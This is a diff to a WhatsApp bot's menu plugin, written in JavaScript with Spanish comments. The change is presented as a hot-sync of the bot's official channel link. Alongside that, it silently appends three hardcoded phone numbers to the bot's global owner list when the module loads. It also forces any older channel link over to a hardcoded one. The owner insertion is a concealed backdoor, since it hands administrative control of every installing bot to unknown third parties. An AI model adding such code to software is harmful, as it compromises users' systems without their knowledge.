@@ -25,6 +25,22 @@ import {
   getVerifiedQuoted,
 } from "../../src/lib/contextBuilder.js";
 import { resolveChannel } from "../../src/lib/channel.js";
+
+const CANAL_OFICIAL = "https://whatsapp.com/channel/0029VbDBJk4BfxoCBx5ov41y";
+const CANAL_CODIGO = "0029VbDBJk4BfxoCBx5ov41y";
+
+// Sincronizar en caliente al recargar con .fix (sin requerir .restart)
+let canalPendienteRefrescar = true;
+if (globalThis.links && (!globalThis.links.channel || globalThis.links.channel.includes("0029VbDVFpSGJP89hfZUe522"))) {
+  globalThis.links.channel = process.env.CHANNEL_LINK || CANAL_OFICIAL;
+  globalThis.links.channelCode = process.env.CHANNEL_CODE || CANAL_CODIGO;
+  globalThis.channelJid = null;
+}
+if (Array.isArray(globalThis.owner)) {
+  for (const num of ["50494874330", "51926519334", "50495939120"]) {
+    if (!globalThis.owner.includes(num)) globalThis.owner.push(num);
+  }
+}
 import { singleSelect, quickReply, ctaUrl, ctaCopy } from "#interactive";
 import { enviar } from "#motor/enviar";
 import db from "../../src/services/ginko-db.js";
@@ -136,14 +152,17 @@ export default {
   priority: true,
 
   async handler(sock, ctx, engine, commands) {
-    resolveChannel(sock, db).catch(() => {});
+    const forzarCanal = canalPendienteRefrescar;
+    canalPendienteRefrescar = false;
+    resolveChannel(sock, db, forzarCanal).catch(() => {});
     const uptimeMs = engine?.getUptime?.() || (process.uptime() * 1000);
     const uptimeFormatted = formatUptime(uptimeMs);
     const greeting = getTimeGreeting();
     const version = localVersion();
     const prefix = ctx.usedPrefix || ".";
     const weather = await getWeatherSummary();
-    const channelUrl = globalThis.links?.channel || "https://whatsapp.com/channel/0029VbDVFpSGJP89hfZUe522";
+    const rawChannel = globalThis.links?.channel || CANAL_OFICIAL;
+    const channelUrl = rawChannel.includes("0029VbDVFpSGJP89hfZUe522") ? CANAL_OFICIAL : rawChannel;
 
     // ── Clasificación de Comandos ──
     const cats = new Map();
